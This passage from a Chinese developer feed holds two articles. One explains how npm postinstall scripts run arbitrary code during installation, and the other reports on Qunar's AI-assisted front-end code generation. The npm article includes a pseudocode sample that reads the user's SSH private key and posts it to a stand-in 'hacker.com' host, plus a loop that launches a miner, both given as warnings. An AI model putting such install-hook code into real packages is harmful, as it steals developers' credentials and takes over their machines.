到底背着我干了啥？"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-14T07:37:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端九哥"/> <meta itemprop="url" content="https://juejin.cn/user/3659622444970574"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            装个依赖把公司电脑干报废了？npm i 到底背着我干了啥？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3659622444970574/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端九哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:37:21.000Z" title="Wed Jan 14 2026 07:37:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>“我就 npm i 一下，风扇狂转、CPU 拉满、终端卡死、VPN 掉线……”</strong></p>
<p>你一脸懵逼：
👉 <em>我到底装的是依赖，还是在电脑里放了个核反应堆？</em> ☢️</p>
</blockquote>
<p>别慌。
这事儿，<strong>npm 真干得出来。</strong></p>
<p>今天我们就来扒一扒，当你敲下回车的那一刻，你的电脑到底经历了什么。</p>
<h2 data-id="heading-0"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/620f8974c4bf42a28d34053e81cbe578~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Lmd5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768981041&amp;x-signature=QJuBi25St1Czil4i9vKaisqmq8A%3D" alt="O3251.gif" loading="lazy"/></h2>
<h2 data-id="heading-1">💬 引言：npm i ≠ 下载几个包这么简单</h2>
<p>很多人（包括曾经的我）以为：</p>
<pre><code class="hljs language-bash" lang="bash">npm install
</code></pre>
<p>它的工作流程只是：</p>
<blockquote>
<p>📦 联网下载依赖 → 📂 解压到 node_modules → ✅ 完事</p>
</blockquote>
<p>但<strong>真实流程</strong>更像这样👇</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb7d19afdfa44cb28afc2106a53bc99b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Lmd5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768981041&amp;x-signature=ddfMIJJH%2Boc5QD2N%2BW9JMxL7TTo%3D" alt="image.png" loading="lazy"/></p>
<p>一句话总结：</p>
<blockquote>
<p><strong>npm install 是一个“默认允许第三方包在你的电脑上执行任意代码”的操作。</strong></p>
</blockquote>
<p>是的，<strong>任意代码。</strong></p>
<hr/>
<h2 data-id="heading-2">🧠 真正的幕后黑手：npm scripts</h2>
<h3 data-id="heading-3">👿 package.json 里最容易被忽略的一块</h3>
<p>当你引入一个包时，你不仅引入了它的代码，还引入了它的 <code>package.json</code>。请看这段平平无奇的配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"postinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node scripts/setup.js"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>你看到的是一行配置，npm 看到的是：</p>
<ul>
<li>✅ <strong>允许执行代码</strong>：无需你二次确认。</li>
<li>✅ <strong>当前用户权限</strong>：如果你用 <code>sudo npm i</code>，那它就是 root 权限（危）。</li>
<li>✅ <strong>文件系统读写</strong>：可以删除文件，也可以上传文件。</li>
<li>✅ <strong>网络访问</strong>：可以偷偷把你的 <code>.env</code> 发送到远程服务器。</li>
</ul>
<h3 data-id="heading-4">🧨 为什么会把电脑干废？</h3>
<p>最常见的情况是，某个依赖包在 <code>postinstall</code> 里写了构建逻辑：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"postinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npm run build"</span>
</code></pre>
<p>而这个 <code>build</code> 里可能包含了：</p>
<ul>
<li><strong>Webpack/Rollup 全量构建</strong>：几千个文件同时编译。</li>
<li><strong>图片压缩</strong>：瞬间吃满 CPU。</li>
<li><strong>WASM/C++ 编译</strong>：现场编译二进制文件。</li>
</ul>
<p>结果就是👇</p>
<blockquote>
<p>💻 <strong>CPU 100%</strong>：所有核心满载运行。
🔥 <strong>风扇起飞</strong>：温度瞬间飙升。
🧊 <strong>电脑卡死</strong>：鼠标都动不了。</p>
</blockquote>
<p>只要依赖树里有一个包触发了全量构建或编译，你的电脑就会秒变暖手宝。</p>
<hr/>
<h2 data-id="heading-5">🚨 更可怕的是黑客入侵🤖</h2>
<p>资源占用只是“物理伤害”，更可怕的是“魔法伤害”。</p>
<p>理论上，黑客可以发布一个包（或者黑进一个流行包），在 <code>install</code> 脚本里写：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 伪代码：窃取 SSH 密钥并上传</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
<span class="hljs-keyword">const</span> https = <span class="hljs-built_in">require</span>(<span class="hljs-string">'https'</span>);
<span class="hljs-keyword">const</span> sshKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'~/.ssh/id_rsa'</span>);
https.<span class="hljs-title function_">post</span>(<span class="hljs-string">'http://hacker.com'</span>, sshKey);
</code></pre>
<p>或者更直接一点，把你电脑变成矿机：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 伪代码：无限循环占用资源</span>
<span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
  <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'挖矿程序.exe'</span>);
}
</code></pre>
<p>这也是为什么很多安全规范会明确说：</p>
<blockquote>
<p>❗ <strong>严禁在公司内网随意 npm install 来路不明的包。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-6">🧠 那 npm 为啥允许这么干？它不怕吗？</h2>
<p>你可能会问：<em>“这不就是个漏洞吗？官方不管管？”</em></p>
<p>这还真不是漏洞，这是 <strong>Feature</strong>。
npm 的设计理念是：<strong>“包作者需要对安装环境有控制权”</strong>。</p>
<p>这对很多场景是<strong>必须</strong>的：</p>
<ul>
<li>✅ <strong>esbuild</strong>：需要根据你的系统（Mac/Win/Linux）下载对应的二进制文件。</li>
<li>✅ <strong>puppeteer</strong>：需要下载 Chromium 浏览器内核。</li>
<li>✅ <strong>husky</strong>：需要自动配置 git hooks。</li>
<li>✅ <strong>core-js</strong>：需要根据环境配置 polyfill。</li>
</ul>
<p><strong>代价就是：你得无条件信任你安装的每一个包，以及它们依赖的成千上万个子依赖。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[去哪儿网前端代码自动生成技术实践]]></title>    <link>https://juejin.cn/post/7594817135128477730</link>    <guid>https://juejin.cn/post/7594817135128477730</guid>    <pubDate>2026-01-14T07:59:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128477730" data-draft-id="7594576956421292058" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="去哪儿网前端代码自动生成技术实践"/> <meta itemprop="keywords" content="AI编程,前端"/> <meta itemprop="datePublished" content="2026-01-14T07:59:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="去哪儿技术沙龙"/> <meta itemprop="url" content="https://juejin.cn/user/2251436075786791"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            去哪儿网前端代码自动生成技术实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2251436075786791/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    去哪儿技术沙龙
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:59:04.000Z" title="Wed Jan 14 2026 07:59:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 AI 时代，我们重新挖掘了前端开发的提效方向，从去哪儿网的三大业务场景：机酒主流程业务、营销业务、后台服务三大业务场景，提出了 D2C 方案和基于 AI 生成后台代码的方案。</p>
<p>D2C 方案中，我们着重解决了代码的可用性，包括固定宽度、布局精准划分、代码语义化等方面进行了代码健壮性和可维护性的提升，业务需求出码率达到 36%。</p>
<p>基于 AI 生成代码的方案中，需求文档和接口 API 组成的 Prompt，依赖 GPT 生成页面渲染和业务逻辑代码，重点解决了 Prompt 的高效生成以及复杂页面代码的有效生成，业务需求代码出码率达到了 55%。</p>
<p>在不久前举办的 QCon 全球软件开发大会上，去哪儿网前端技术总监姚佳梅带来了精彩的专题演讲“去哪儿网前端代码自动生成技术实践”，围绕去哪儿网三大业务场景的前端代码生成的方案，涵盖了代码生成中的难点和解决思路、AI 的应用和业务的应用提效等，希望能给大家带来一些帮助和思考。</p>
<p><strong>内容亮点</strong></p>
<ul>
<li>
<p>设计稿生成代码在传统算法方案的基础上加入 AI 应用</p>
</li>
<li>
<p>区分 C 端和 B 端两种场景方案，覆盖业务范围更广，有实际应用效果</p>
</li>
</ul>
<p><strong>以下是演讲实录（经 InfoQ 进行不改变原意的编辑整理）。</strong></p>
<p>我将从我们的实际业务开发角度出发，探讨我们是如何利用大型模型在大前端领域实现代码生成，以提高开发效率。我目前负责的是去哪儿网国际机票的前端业务，同时也涉足低代码和营销业务领域。我的工作重点之一就是从业务角度出发，辅助前端开发提效，包括代码生成技术的应用。</p>
<p>今天，我将围绕《去哪儿网前端代码自动生成技术实践》这一主题，展开我的演讲，内容分为四个部分，首先，阐述一下我们的研发现状以及目标达成情况，接着，将分别从 C 端和 B 端的角度探讨我们的解决方案，以及在实践过程中遇到的问题。最后，将分享一下我们的未来规划。</p>
<h2 data-id="heading-0">一、研发现状和目标达成</h2>
<h3 data-id="heading-1">1、C 端和 B 端的业务场景分析</h3>
<p>我们 C 端的业务场景主要分为两大块：主流程业务和营销活动。</p>
<p>主流程业务涵盖了用户在使用我们的系统购买机票、酒店等各类产品时所接触的所有页面。这些页面的 UI 复杂度极高，开发过程中，从 UI 编写到最终验收，需要不断地调整细节，这个过程既繁琐又耗时。其次，C 端业务涉及的客户端类型多样，包括 APP 端、小程序、PC 端和 H5 等。这些不同的客户端都需要我们去适配和开发，进一步增加了工作的复杂性。</p>
<p>营销活动的页面的 UI 复杂度也很高，并且很多页面涉及到复杂交互设计，如秒杀、砍价等。在开发这些营销活动时，我们遇到的痛点主要有两个：一是时间紧迫，比如五一、十一等节日活动，节前必须上线；二是活动量巨大，尽管我们已有低代码平台来解决部分问题，但活动形式的不断更新，使得我们的开发工作量依然巨大。</p>
<p>B 端业务主要指的是我们公司内部使用的各类后台管理系统。这些页面以大量的表单和表格为特征，信息密度极高，内容丰富。随着公司业务的增长，人力资源变得紧张，大量的需求积压。因此，我们开展这项代码生成工作的首要目标是提升前端开发效率。</p>
<h3 data-id="heading-2">2、以往的工作流程</h3>
<p>在前端开发流程中，无论是 C 端还是 B 端，我们都是从需求 PRD（产品需求文档）开始的。对于 C 端，我们通常会有 UI 设计稿，这为我们的开发流程提供了视觉参考。在 C 端开发中，我们首先编写渲染代码，包括布局和样式。渲染代码的开发时间与逻辑代码的开发时间大致相当，各占一半。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af754d381bb04ab598e9226fa91edd01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=6ZXrmyhIH4Tc5E22XxjM0GkysaA%3D" alt="" loading="lazy"/></p>
<p>B 端在大多数情况下，是依赖于需求文档和原型稿进行开发。在 B 端开发中，我们可以使用现有的 UI 框架来实现样式，因此在渲染上花费的时间会比逻辑代码少，逻辑代码的开发时间会占据更大的比例。</p>
<p>B 端在大多数情况下，是依赖于需求文档和原型稿进行开发。在 B 端开发中，我们可以使用现有的 UI 框架来实现样式，因此在渲染上花费的时间会比逻辑代码少，逻辑代码的开发时间会占据更大的比例。</p>
<h3 data-id="heading-3">3、AI 重塑后的开发流程</h3>
<p>在引入 AI 技术重塑我们的开发流程之后，我们的工作方式发生了显著变化。过去，我们是从零开始编写代码，但现在，我们首先获取必要的物料，比如 UI 设计稿和需求文档。接着，我们会进行代码生成，基于这些生成的代码，进行后续的开发工作。我们会对生成的代码进行检查，确保功能没有遗漏，并且确定是否有 AI 无法生成的部分，这些部分就需要我们进行二次开发。</p>
<p>C 端代码生成出码率是 36%，B 端的出码率达到了 55%。出码率是指需求中被应用的自动生成的代码行数占需求上线总代码行数的比例。例如，一个 C 端需求上线了 1000 行代码，其中有 360 行是智能生成的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b732c8498f224a6da5d06711e0462ae4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=pfFjD5acM%2FH7zCv94y2CdpvjARo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">4、代码生成案例</h3>
<p>C 端以一个页面为例，这个页面包含了与后端的交互接口数据以及用户点击和不同状态的交互逻辑。如果从头开始开发，这样的页面通常需要 1 到 2 天的时间。然而，通过我们的 AI 代码生成系统，这个页面的开发可以在短短一个小时内完成。我们的系统首先要求上传 UI 设计稿。上传后，系统大约几秒就能生成渲染代码，同时提供实时预览效果。UI 设计稿在左侧展示，而右侧则是实时预览的效果。这样，我们就能直观地看到生成的渲染代码与设计稿的匹配程度。接下来，我们结合产品需求文档生成一个可交互的 Checklist，这个 Checklist 帮助我们对需求点进行详细分析，梳理成一个完善的结构，为后续的代码生成打下基础。这份 Checklist 的数据会传递给 GPT，由它来生成逻辑代码。这部分代码包括页面与后端的交互以及页面本身的交互逻辑，比如点击某个按钮后的行为，或者页面的埋点信息等，基本上页面的大部分交互逻辑都能通过 AI 生成。</p>
<p>B 端的案例页面包含了表单、表格，以及一个树形结构和搜索框，页面的另一侧是节点的详细内容。如果从头开始开发，这样的页面同样需要 1 到 2 天的时间，而我们的 AI 代码生成系统也能在一个小时内完成开发。我们在一个系统中新建页面，然后将页面的所有模块进行拆分。针对每个模块编写提示词，并将这些提示词发送给 GPT 以生成代码。这个过程支持多轮对话，如果生成的代码不够好或者有功能遗漏，我们可以继续与 GPT 对话，指导它进行修正。所有模块生成后，会跳转到我们的在线编辑页面，左侧是编辑区，右侧是实时预览区。GPT 生成的实时预览页面的初版整体可用性已经非常高，所有的操作，比如点击查询后表单的显示，以及表格的生成，都是从真实后端接口数据中获取的，而不是一个静态的页面。</p>
<h2 data-id="heading-5">二、C 端业务场景解决方案</h2>
<p>在 C 端业务场景中，我们对代码生成的要求主要有两个方面。首先，由于 UI 设计稿的样式复杂，我们需要高还原度的代码以确保代码的可用性。其次，考虑到主流程业务的更新迭代，我们对生成的代码质量有较高要求。为了进一步提升效率，我们还希望生成业务和交互逻辑代码。</p>
<p>在技术方案选型上，我们首先考虑了从设计稿到渲染代码的 D2C 方案。业界已经有很多成熟且优秀的 D2C 方案，我们进行了调研和试验，这些方案的 UI 还原度普遍在 90% 以上。然而，仅仅有高还原度是不够的，我们还需要考虑到代码的布局合理性、避免固定宽度以及语义化等问题。这些代码在简单图文场景下或许足够，但对于需要后续更新迭代的主流程代码来说还不能满足需求。此外，大多数优秀产品不开源，这意味着我们无法基于它们进行优化。</p>
<p>考虑到 AI 技术的流行趋势，我们也探索了现有的大模型是否能够从设计稿生成高 UI 还原度的代码。我们尝试了多个案例，并不断优化提示词，但效果大同小异。在对 UI 还原度要求极高的场景下，仅提供设计稿生成的效果往往达不到我们的要求，许多细节模块可能缺失。同时，在业务需求上线前，我们缺乏对 UI 稿有效的脱敏手段，无法将其直接提供给外部。</p>
<p>我们进行了其他方向的探索。一方面，我们针对 D2C 方案中语义化不足的问题，在大模型中进行了尝试，效果非常好。另一方面，我们利用大模型对自然语言处理的优势，根据文字描述生成交互逻辑代码。最终，我们选择了一个综合方案：自研一套 D2C 方案，重点解决布局不合理、固定宽度等问题，并结合 AI 优化渲染代码，同时利用 AI 根据需求文档生成逻辑代码。这样的方案既满足了我们对 UI 还原度和代码质量的要求，也提高了开发效率，并且能够适应后续需求的更新迭代。</p>
<h3 data-id="heading-6">1、系统架构</h3>
<p>我们的代码生成架构是一个自上而下的流程，它包括用户输入、中间生成、以及最终的目标代码输出。用户输入部分，我们目前支持 Sketch 和 Figma 这两种 UI 设计软件的稿件，以及需求产品文档。</p>
<p>从用户输入的 UI 稿件到中间的 D2C 描述及渲染代码的生成，整个过程是一个典型的 D2C 转换。我们首先获取 UI 稿件，然后对其中大量的图层数据进行解析，生成我们所需的 DSL 结构。在这个结构基础上，我们进行布局和样式的生成，最终得到包含布局和样式的 DSL。之后，我们将这个 DSL 翻译成目标代码，目前我们支持的目标代码包括 React Native、Shark（自研的跨端营销活动框架）、Taro 以及 ArkUI。在获得渲染代码之后，我们利用 GPT 进行语义化处理，以及代码组件的拆分和列表数据的循环。完成这些步骤后，我们再结合需求 PRD 和本地 SDK 代码库依赖 GPT 进行逻辑代码的生成。所有代码生成完毕后，开发会进入检查和补充开发环节。需求经过测试上线后，就会触发出码率的自动计算。</p>
